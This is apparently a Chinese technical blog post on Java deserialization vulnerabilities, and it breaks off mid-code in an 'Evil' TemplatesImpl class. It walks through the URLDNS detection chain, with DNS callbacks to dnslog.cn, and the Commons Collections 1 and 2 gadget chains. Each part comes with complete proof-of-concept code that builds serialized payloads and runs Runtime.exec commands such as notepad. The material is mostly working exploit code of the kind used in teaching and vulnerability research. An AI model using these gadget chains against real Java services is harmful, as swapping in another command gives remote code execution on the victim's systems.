---
title: JAVA反序列化漏洞总结
tags:
  - 知识点总结
  - Java反序列化
categories: 
  - Java
  - CommonsCollections
  - 反序列化
typora-root-url: JAVA反序列化漏洞总结
description: Java unserialize Summary
excerpt: Java unserialize Summary
abbrlink: 51973
date: 2022-02-27 15:28:17
---

## 什么是Java反序列化漏洞

### 0x1 Java反序列化概述

Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存或文件中，实现跨平台通讯和持久化存储。ObjectOutputStream类的 writeObject() 方法可以实现序列化。反序列化则指把字节序列恢复为 Java 对象的过程，相应的，ObjectInputStream 类的 readObject() 方法用于反序列化。

### 0x2 反序列化示例

```java
package test;

import java.io.*;

public class Serialize {
        public static void main(String args[])throws Exception{
            MyObject myObject=new MyObject();
            myObject.name="hello world!";
            //创建一个包含对象进行反序列化信息的”object”数据文件
            FileOutputStream fos=new FileOutputStream("object.obj");
            ObjectOutputStream os=new ObjectOutputStream(fos);
            //writeObject()方法将obj对象写入object文件
            os.writeObject(myObject);
            os.close();
            //从文件中反序列化obj对象
            FileInputStream fis=new FileInputStream("object.obj");
            ObjectInputStream ois=new ObjectInputStream(fis);
            //恢复对象
            MyObject obj2=(MyObject)ois.readObject();
            System.out.print(obj2);
            ois.close();
        }
}
class MyObject implements Serializable {//只有实现了Serializable接口的类的对象才可以被序列化
    public String name;
    //重写readObject()方法
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
        //执行默认的readObject()方法
        in.defaultReadObject();
        //执行打开计算器程序命令
        Runtime.getRuntime().exec("cmd.exe /c start dir");
    }
}
```

总结一下Java要触发反序列漏洞的类的条件：

* 实现java.io.Serializable接口
* 重写readObject方法

### 0x3 URLDNS 检测链

使用URLDNS链可以快速检测目标系统是否存在反序列化漏洞，其原因主要由下面两个特点决定：

* 只依赖原生类
* 对JDK版本不限制

先给出利用链：

```java
- HashMap.readObject()
    - HashMap.putVal()
    	- HashMap.hash()
    		- URL.hashCode()
    			- URLStreamHandler.hashCode()
    				- URLStreamHandler.getHostAddress()
```

#### 0x31 利用链分析

注意URLDNS检测链需要配合一个DNSLog平台，此处选择了dnslog.cn平台。

先获取一个子域名，在以下的讲解中，查询地址均为juns.subdomain.dnslog.cn。

运行以下代码，检测DNSLog平台，应该会看到一次DNS查询记录：

```java
package com.company;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class Main {

    public static void main(String[] args) throws MalformedURLException {
        HashMap test = new HashMap();
        URL url = new URL("http://juns.36z0dq.dnslog.cn");
        test.put(url, 1);
    }
}

```

你应该看到如下的输出：

![image-20220301110308499](image-20220301110308499.png)

接下来分析为什么会出现该记录。

首先从HashMap开始分析，注意HashMap是JDK中的原生类，并且继承了**Serializable**接口以及实现了**readObject**方法。

先看HashMap的put方法：

```java
    public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
```

只是调用了本类的**putVal**方法，同时还调用了本类的**hash**方法，跟进**hash**方法：

```java
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
```

发现当key不为null时，调用了其**hashCode**方法，由于我们put的是一个URL对象，因此肯定会调用**URL对象的hashCode**方法，于是跟进URL的hashCode方法：

```java
    public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
```

当hashCode不为-1时，调用了**handler的hashCode**方法，在类的初始化时：

```java
/* Our hash code.
 * @serial
 */
private int hashCode = -1;
```

说明handler的hashCode方法必然会被调用，于是查看handler类型：

```java
    transient URLStreamHandler handler;
```

是一个URLStreamHandler的对象，于是跟进其hashCode方法：

```java
    protected int hashCode(URL u) {
        int h = 0;

        // Generate the protocol part.
        String protocol = u.getProtocol();
        if (protocol != null)
            h += protocol.hashCode();

        // Generate the host part.
        InetAddress addr = getHostAddress(u);
        if (addr != null) {
            h += addr.hashCode();
        } else {
            String host = u.getHost();
            if (host != null)
                h += host.toLowerCase().hashCode();
        }

        // Generate the file part.
        String file = u.getFile();
        if (file != null)
            h += file.hashCode();

        // Generate the port part.
        if (u.getPort() == -1)
            h += getDefaultPort();
        else
            h += u.getPort();

        // Generate the ref part.
        String ref = u.getRef();
        if (ref != null)
            h += ref.hashCode();

        return h;
    }
```

重点关注的是：

```java
        // Generate the host part.
        InetAddress addr = getHostAddress(u);
```

此处尝试获取了主机地址，其方法如下：

```java
    protected synchronized InetAddress getHostAddress(URL u) {
        if (u.hostAddress != null)
            return u.hostAddress;

        String host = u.getHost();
        if (host == null || host.equals("")) {
            return null;
        } else {
            try {
                u.hostAddress = InetAddress.getByName(host);
            } catch (UnknownHostException ex) {
                return null;
            } catch (SecurityException se) {
                return null;
            }
        }
        return u.hostAddress;
    }
```

**InetAddress.getByName(host)**是根据主机名获取其对应IP，即相当于进行了一次DNS查询。

#### 0x32 从readObject开始

上面虽然分析了为什么在HashMap中进行一次put(URL)会产生一次DNS查询，但是并未从反序列化漏洞的角度去分析，接下来我们从**readOject方法**开始去进行分析，如何利用该链进行一次DNS查询。

首先看HashMap的readOject：

```java
    private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
			/**
			...
			*/
            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

这里只关注重点的代码，可以发现，在反序列化时，取Key和Value都时对ObjectInputStream进行了readObject方法的调用，我们可以关注一下writeObject到底写入了什么数据：

```java
    private void writeObject(java.io.ObjectOutputStream s)
        throws IOException {
        int buckets = capacity();
        // Write out the threshold, loadfactor, and any hidden stuff
        s.defaultWriteObject();
        s.writeInt(buckets);
        s.writeInt(size);
        internalWriteEntries(s);
    }
```

显然实际的数据写入操作在**internalWriteEntries**，查看该方法：

```java
    void internalWriteEntries(java.io.ObjectOutputStream s) throws IOException {
        Node<K,V>[] tab;
        if (size > 0 && (tab = table) != null) {
            for (int i = 0; i < tab.length; ++i) {
                for (Node<K,V> e = tab[i]; e != null; e = e.next) {
                    s.writeObject(e.key);
                    s.writeObject(e.value);
                }
            }
        }
    }
```

其中的tab实际就是HashMap的table了，也就是说序列化时写入了HashMap的table，我们只需要向HashMap进行put操作即可改变其table。

在readOject后会执行putVal方法，于是又回到了开始的利用链分析，即可以得到以下的POC：

```java
package com.company;

import java.io.*;
import java.net.URL;
import java.util.HashMap;

public class Main {

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        HashMap test = new HashMap();
        URL url = new URL("http://poc.36z0dq.dnslog.cn");
        test.put(url, 1);

        // ser
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("./test.obj"));
        out.writeObject(test);
        out.close();

        // uns
        ObjectInputStream in = new ObjectInputStream(new FileInputStream("./test.obj"));
        HashMap read_test = (HashMap) in.readObject();

    }
}

```

然后查看我们的DNSLog记录，会发现如下结果：

![image-20220301113829042](image-20220301113829042.png)

#### 0x33 去除Payload生成时产生的查询

上面可以看到产生了两次查询，这会在实际测试时影响我们的判断，那么如何去除生成Payload时产生的查询呢？

其实非常简单，注意到反序列化时，如果URL的hashCode不为-1时，就不会去掉用其Handler的hashCode方法，于是我们可以利用反射完成：

```java
package com.company;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class Main {

    public static void main(String[] args) throws Exception {
        HashMap test = new HashMap();
        URL url = new URL("http://sq-poc.36z0dq.dnslog.cn");
        Field hashCode = Class.forName("java.net.URL").getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.set(url, 1);
        test.put(url, 1);
        hashCode.set(url, -1);

        // ser
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("./test.obj"));
        out.writeObject(test);
        out.close();

        // uns
        ObjectInputStream in = new ObjectInputStream(new FileInputStream("./test.obj"));
        HashMap read_test = (HashMap) in.readObject();

    }
}
```

在put时，我们将url的hashCode设为一个非-1值，在put后，我们将其修改回-1，从而可以让反序列化时调用handler的hashCode方法。

实际效果：

![image-20220301114615172](image-20220301114615172.png)

### 0x4 CC链

#### 0x41 Commons Collections 1链

##### 0x411 环境参数

* Java 1.7
* Commons Collections 3.1

Pom.xml如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>cc</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>7</maven.compiler.source>
        <maven.compiler.target>7</maven.compiler.target>
    </properties>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>
</project>
```

##### 0x412 动态代理模式

在开始分析该反序列化链前，先考虑一个Java的设计模式——代理模式。

代理模式简单来说就是将操作递交给代理，代理操作后返回。

在Java中，最常见的代理模式使用接口与继承了该接口的类来实现，但是还有一种比较特殊的用法，即动态代理，考虑一个最简单的动态代理：

```java
interface Msg{
    String say(String name);
}

public class Main {
    public static void main(String[] args) {
        InvocationHandler handler = new InvocationHandler() {
            @Override
            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                if(method.getName().equals("say")){
                    return "hello " + args[0];
                }
                return null;
            }
        };
        Msg msg = (Msg) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Msg.class}, handler);
        System.out.println(msg.say("evalexp"));
    }
}

```

该动态代理直接略去了继承接口的类的实现，而是通过动态代理直接生成了一个具有say方法实现的对象。

动态代理主要依赖于InvocationHandler中的invoke方法来实现对接口的调用。

##### 0x413 利用链分析

先给出整体的一个利用链：

```java
- ObjectInputStream.readObject()
  - AnnotationInvocationHandler.readObject()
    - Map(Proxy).entrySet()
      - AnnotationInvocationHandler.invoke()
        - LazyMap.get()
          - ChainedTransformer.transform()
            - ConstantTransformer.transform()
            - InvokerTransformer.transform()
              - Method.invoke()
                - Class.getMethod()
            - InvokerTransformer.transform()
              - Method.invoke()
                - Runtime.getRuntime()
            - InvokerTransformer.transform()
              - Method.invoke()
                - Runtime.exec()
```

接下来从局部命令执行到最终RCE进行分析，Commons Collections有一个Transformer接口，包含了一个transform方法，通过实现该接口来进行类型转换。

在众多的实现中，CC1依赖于以下三个类：

* InvokerTransformer
* ConstantTransformer
* ChainedTransformer

三个的实现方法分别为：

```java
	// InvokerTransformer
	public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var7) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
            }
        }
    }
```

该类使用了反射来调用某一个方法。

```java
	// ConstantTransforer
	public Object transform(Object input) {
        return this.iConstant;
    }
```

该类只是原封不动地返回。

```java
	// ChainedTransformer
	public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }

        return object;
    }
```

该类的实现将每个传入的transformer都进行了transform操作，并且将结果作为下一次的输入传递进去。

结合上面三个类，不难发现我们可以实现一个命令执行：

```java
ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                  new ConstantTransformer(Runtime.class),
                  new InvokerTransformer("getMethod", new Class[] {
                          String.class, Class[].class }, new Object[] {
                          "getRuntime", new Class[0] }),
                  new InvokerTransformer("invoke", new Class[] {
                          Object.class, Object[].class }, new Object[] {
                          null, new Object[0] }),
                  new InvokerTransformer("exec",
                          new Class[] { String.class }, new Object[]{"notepad"})});
chain.transform(0);
```

观察其结构，注意我们调用chain.transform时，先调用了ConstantTransformer的transform，此时object=Runtime.class，将该object传入InvokerTransformer，从上面的代码可以发现，我们可以利用Class类的getMethod拿到Runtime的getRuntime方法(getMethod方法的参数中需要传递一个可变参数因此我们需要在参数类型中加一个Class[].class，而后面参数中的只是占位作用)。

在这个时候我们已经拿到了一个Method(即Runtime的getRuntime)类，再将其传递给一个InvokerTransformer类，执行其Method类的invoke方法，而该方法于getMethod类似，我们也需要传递Object[].class以及占位，这也我们就得到了一个Runtime.getRuntime()对象，而这个对象再向下传递，执行其exec方法，从而执行了命令。

那么接下来需要考虑的问题就是，如何去在反序列后触发transform方法呢？

我们需要在调用readObject后触发该方法，在CC1中，使用的是Lazymap的get方法，该方法如下：

```java
	public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }
```

注意到调用了其factory的transform方法，查看器代码可以发现factory并没有被transient和static修饰，因此我们可以在类初始化时定义传入，由于LazyMap的构造方法：

```java
    protected LazyMap(Map map, Transformer factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        } else {
            this.factory = factory;
        }
    }
```

注意这是一个protected修饰的构造方法，我们需要使用反射去获取该构造方法。

```java
        HashMap inMap = new HashMap();
        Class LZMClass = Class.forName("org.apache.commons.collections.map.LazyMap");
        Constructor constructor = LZMClass.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        LazyMap map = (LazyMap) constructor.newInstance(inMap, chain);
        map.get(123);
```

将上面的命令执行代码的transform方法删除，在其下添加以下代码，我们会发现确实也成功地执行了命令。

那么怎么在readObject后调用LazyMap的get方法呢？

此处用到了AnnotationInvocationHandler，这个类实现了InvocationHandler，故可以被作为代理类的Handler，我们查看其invoke方法：

```java
    public Object invoke(Object var1, Method var2, Object[] var3) {
        String var4 = var2.getName();
        Class[] var5 = var2.getParameterTypes();
        if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
            return this.equalsImpl(var3[0]);
        } else if (var5.length != 0) {
            throw new AssertionError("Too many parameters for an annotation method");
        } else {
            byte var7 = -1;
            switch(var4.hashCode()) {
            case -1776922004:
                if (var4.equals("toString")) {
                    var7 = 0;
                }
                break;
            case 147696667:
                if (var4.equals("hashCode")) {
                    var7 = 1;
                }
                break;
            case 1444986633:
                if (var4.equals("annotationType")) {
                    var7 = 2;
                }
            }

            switch(var7) {
            case 0:
                return this.toStringImpl();
            case 1:
                return this.hashCodeImpl();
            case 2:
                return this.type;
            default:
                Object var6 = this.memberValues.get(var4);
                if (var6 == null) {
                    throw new IncompleteAnnotationException(this.type, var4);
                } else if (var6 instanceof ExceptionProxy) {
                    throw ((ExceptionProxy)var6).generateException();
                } else {
                    if (var6.getClass().isArray() && Array.getLength(var6) != 0) {
                        var6 = this.cloneArray(var6);
                    }

                    return var6;
                }
            }
        }
    }
```

不难发现在最后的switch的default情况下，对类成员的memberValues调用了get方法，如果将该类实例的memberValues设为我们的LazyMap对象，那么就可以RCE了。

现在的问题是如何去调用这个类的invoke方法，在该类的readObject中我们能看到一段这样的代码：

```java
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();

        while(var4.hasNext()) {
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }

    }
```

注意其中的this.memberValues.entrySet()，如果考虑memberValues是一个代理的话，那么此时调用的方法就会变为其invoke方法，从而RCE。

这里需要注意，我们需要设置两个Handler，第一个用于触发LazyMap的get方法，而第二个是为了触发代理的invoke方法。

先给出完整的POC：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws Exception{
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"notepad"})});
//        chain.transform(0);
        HashMap inMap = new HashMap();
        Class LZMClass = Class.forName("org.apache.commons.collections.map.LazyMap");
        Constructor lzm_constructor = LZMClass.getDeclaredConstructors()[0];
        lzm_constructor.setAccessible(true);
        LazyMap map = (LazyMap) lzm_constructor.newInstance(inMap, chain);

        Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handler_constructor.setAccessible(true);
        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map);

        Map map_proxy = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[] {Map.class}, map_handler);
        InvocationHandler handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map_proxy);

        try{
            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("./cc1"));
            out.writeObject(handler);
            out.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc1"));
            inputStream.readObject();
        }catch (Exception e){

        }
    }
}

```

接下来看其中的一些细节，首先我们使用一个AnnotationInvocationHandler代理了我们的LazyMap对象，随后再使用一个相同的AnnotationInvocationHandler代理了我们的代理，可能会有些绕，让我们回到readObject方法，在该方法中，调用了entrySet()方法，注意此时memberValues应该是一个代理，即AnnotationInvocationHandler对象，而这一操作将调用AnnotationInvocationHandler对象的invoke方法，随后再到get方法。

参考上面的代码，handler对象的memberValues是map_proxy，当readObject时，调用了map_proxy的invoke方法，从而调用了map_proxy所代理的LazyMap对象的get方法，综合上面，这样就形成了一个完整的RCE利用链。

#### 0x42 Commons Collections 2链

##### 0x421 环境参数

* Java 1.7
* Commons Collections 4.0
* javassit(非必要)

Pom.xml如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>cc</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>7</maven.compiler.source>
        <maven.compiler.target>7</maven.compiler.target>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.25.0-GA</version>
        </dependency>
    </dependencies>
</project>
```

##### 0x422 javassit相关

由于CC2链用到了这部分的知识，因此需要特别说明一下。

> 并非一定需要使用javassit，自己先编写类编辑得到字节码也是可以的。

这是一个对于class文件进行生成的相关工具，参考如下代码：

```java
import java.lang.reflect.Modifier;
import javassist.*;

public class Main {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();

        CtClass tc = pool.makeClass("Test");
        CtField param = new CtField(pool.get("java.lang.String"), "testStr", tc);
        param.setModifiers(Modifier.PRIVATE);
        tc.addField(param, CtField.Initializer.constant("test"));
        tc.addMethod(CtNewMethod.getter("getName", param));
        tc.addMethod(CtNewMethod.setter("setName", param));

        CtConstructor constructor = new CtConstructor(new CtClass[]{}, tc);
        constructor.setBody("{testStr = \"test\";}");
        tc.addConstructor(constructor);

        CtMethod tm = new CtMethod(CtClass.voidType, "test", new CtClass[]{}, tc);
        tm.setModifiers(Modifier.PUBLIC);
        tm.setBody("{System.out.println(testStr);}");
        tc.addMethod(tm);

        tc.writeFile("./");
    }
}
```

得到的Class文件反编译后是这样的：

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

public class Test {
    private String testStr = "test";

    public String getName() {
        return this.testStr;
    }

    public void setName(String var1) {
        this.testStr = var1;
    }

    public Test() {
        this.testStr = "test";
    }

    public void test() {
        System.out.println(this.testStr);
    }
}
```

这样子就应该很容易理解如何javassit去产生class文件。

##### 0x423 结合CC1的利用链分析

还是先给出利用链：

```java
ObjectInputStream.readObject()
  - PriorityQueue.readObject()
    - PriorityQueue.heapify()
      - PriorityQueue.siftDown()
        - PriorityQueue.siftDownUsingComparator()
          - TransformingComparator.compare()
            - ChainedTransformer.transform()
    		  - CC1...
              - InvkoerTransformer.transform()
                - Method.invoke()
                  - Runtime.exec()
```

不难发现其实后半段和CC1链的利用差不多，因此在这里只对前面进行分析。

我们先看PriorityQueue的readObject方法：

```java
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in size, and any hidden stuff
        s.defaultReadObject();

        // Read in (and discard) array length
        s.readInt();

        queue = new Object[size];

        // Read in all elements.
        for (int i = 0; i < size; i++)
            queue[i] = s.readObject();

        // Elements are guaranteed to be in "proper order", but the
        // spec has never explained what that might be.
        heapify();
    }
```

可以看到对queue[i]的赋值是进行了readObject得到的，于是我们可以查看其writeObject到底写入了什么：

```java
    private void writeObject(java.io.ObjectOutputStream s)
        throws java.io.IOException{
        // Write out element count, and any hidden stuff
        s.defaultWriteObject();

        // Write out array length, for compatibility with 1.5 version
        s.writeInt(Math.max(2, size + 1));

        // Write out all elements in the "proper order".
        for (int i = 0; i < size; i++)
            s.writeObject(queue[i]);
    }
```

确实也是当前对象的queue数组内的内容。

再看其**heapify**方法：

```java
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
		siftDown(i, (E) queue[i]);
}
```

而**siftDown**方法如下：

```java
    private void siftDown(int k, E x) {
        if (comparator != null)
            siftDownUsingComparator(k, x);
        else
            siftDownComparable(k, x);
    }
```

而其中的x是queue数组中的对象，相当于可控的，而comparator则是在PriorityQueue的构造函数中可传入。从语义不难看出，只是是否使用比较器进行一个siftDown操作，没有比较器则使用默认的compareTo方法，此处我们关注的是使用比较器的方法：

```java
private void siftDownUsingComparator(int k, E x) {
	int half = size >>> 1;
	while (k < half) {
		int child = (k << 1) + 1;
		Object c = queue[child];
		int right = child + 1;
		if (right < size && 
            comparator.compare((E) c, (E) queue[right]) > 0)
			c = queue[child = right];
		if (comparator.compare(x, (E) c) <= 0)
			break;
		queue[k] = c;
		k = child;
	}
	queue[k] = x;
}
```

重点在于`comparator.compare(x, (E) c)`。

在CC2链中，利用了TransformingComparator的compare方法来触发后续的链，其代码如下：

```java
public int compare(I obj1, I obj2) {
	O value1 = this.transformer.transform(obj1);
	O value2 = this.transformer.transform(obj2);
	return this.decorated.compare(value1, value2);
}
```

可见，此处调用了本类的transformer成员的transform方法，而这就是CC1链中的一个触发条件，即调用ChainedTransformer的transform方法。

如果此处能让TransformingComparator对象的transformer成员受控的话，那么就能链接到CC1链的ChainedTransformer上去。

查看其声明：

```java
    private final Transformer<? super I, ? extends O> transformer;
```

并没有被static或transient修饰，可控。

于是可以得到一种POC如下：

```java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
public class Main {
    public static void main(String[] args) throws Exception{
        ChainedTransformer chain = new ChainedTransformer(new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"notepad"}));

        TransformingComparator comparator = new TransformingComparator(chain);
        PriorityQueue queue = new PriorityQueue(10);

        queue.add(0);
        queue.add(0);

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue,comparator);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc2"));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc2"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }

    }
}
```

其中上半部分代码和CC1一致，重点在于下面，让我们再来捋一遍：

1. PriorityQueue调用TransformingComparator的compare方法
2. TransformingComparator调用其成员tranformer的transform方法

而TransformingComparator的tranformer对象的初始化就在构造方法内，于是可以得到上述的无其它依赖POC。

整体细节把握：

1. 必须添加两个以上的元素，否则不会执行siftDown，可见heapify的定义
2. 必须在添加元素后再设置比较器，否则会出现异常(由于无法正常完成比较，在比较器为null时可以调用默认的compareTo方法)
2. 执行命令两次是因为在TransformingComparator的compare方法中transform方法被调用了两次

##### 0x424 基于字节码的利用链

这一链实际来源于ysoserial，实际上就是使用javassit生成一个含有恶意代码的class，然后利用TemplatesImpl的**defineTransletClasses**方法加载该Class文件从而RCE。

先看其利用链：

```java
ObjectInputStream.readObject()
  - PriorityQueue.readObject()
    - PriorityQueue.heapify()
      - PriorityQueue.siftDown()
        - PriorityQueue.siftDownUsingComparator()
          - TransformingComparator.compare()
            - 参考上方结合CC1的CC2链...
              - Method.invoke()
                - TemplatesImpl.newTransformer()
                  - TemplatesImpl.getTransletInstance()
                  - TemplatesImpl.defineTransletClasses
                  - newInstance()
                  - Runtime.exec()
```

前半段实际和CC2仅CC依赖是一样的，重点在于后面的TemplatesImpl及之后的操作。

其newTransformer方法如下：

```java
    public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    {
        TransformerImpl transformer;

        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);

        if (_uriResolver != null) {
            transformer.setURIResolver(_uriResolver);
        }

        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
```

可以看到有一个**getTransletInstance**方法的调用。该方法如下：

```java
    private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setServicesMechnism(_useServicesMechanism);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }

            return translet;
        }
        catch (xxx) {}
    }
```

为了方便，catch后的我删掉了，可以看到很关键的一个地方，即**defineTransletClasses()**的调用和`AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();`，先看**defineTransletClasses**的代码：

```java
    private void defineTransletClasses()
        throws TransformerConfigurationException {

        if (_bytecodes == null) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        }

        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });

        try {
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];

            if (classCount > 1) {
                _auxClasses = new Hashtable();
            }

            for (int i = 0; i < classCount; i++) {
                _class[i] = loader.defineClass(_bytecodes[i]);
                final Class superClass = _class[i].getSuperclass();

                // Check if this is the main class
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                }
                else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }

            if (_transletIndex < 0) {
                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
                throw new TransformerConfigurationException(err.toString());
            }
        }
        catch (xxx){}
    }
```

不难发现这是将成员bytecodes还原为Class，并且确定了main class的索引号，然后在getTransletInstance方法根据该索引号实例化该对象，如果我们的bytecode包含了static语句块，此时就将执行其中的语句块，从而RCE。

先放Evil的类代码：

```java
package com.sun.org.apache.xalan.internal.xsltc.runtime;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Evil extends AbstractTranslet{
    static {
        try {
            Runtime.getRuntime().exec("notepad");
        } catch (java.io.IOException e) {
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
